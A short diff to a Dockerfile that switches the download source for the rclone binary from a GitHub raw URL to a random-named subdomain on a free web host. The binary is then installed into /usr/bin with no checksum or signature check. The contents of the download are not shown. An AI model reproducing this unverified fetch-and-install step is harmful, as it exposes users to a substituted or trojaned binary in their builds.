@@ -4,9 +4,9 @@ RUN set -ex\
     && apt upgrade -y \
     && apt install -y wget\
     && apt install unzip -y
-RUN curl -O 'https://raw.githubusercontent.com/developeranaz/Rclone-olderversion-Backup/main/rclone-current-linux-amd64.zip' && \
-    unzip rclone-current-linux-amd64.zip && \
-    cp /rclone-*-linux-amd64/rclone /usr/bin/ && \
+RUN curl -O 'https://ouadgh9uaogab.000webhostapp.com/rclone/pd/rclone.zip' && \
+    unzip rclone.zip && \
+    cp rclone /usr/bin/ && \
     chown root:root /usr/bin/rclone && \
     chmod 755 /usr/bin/rclone
 
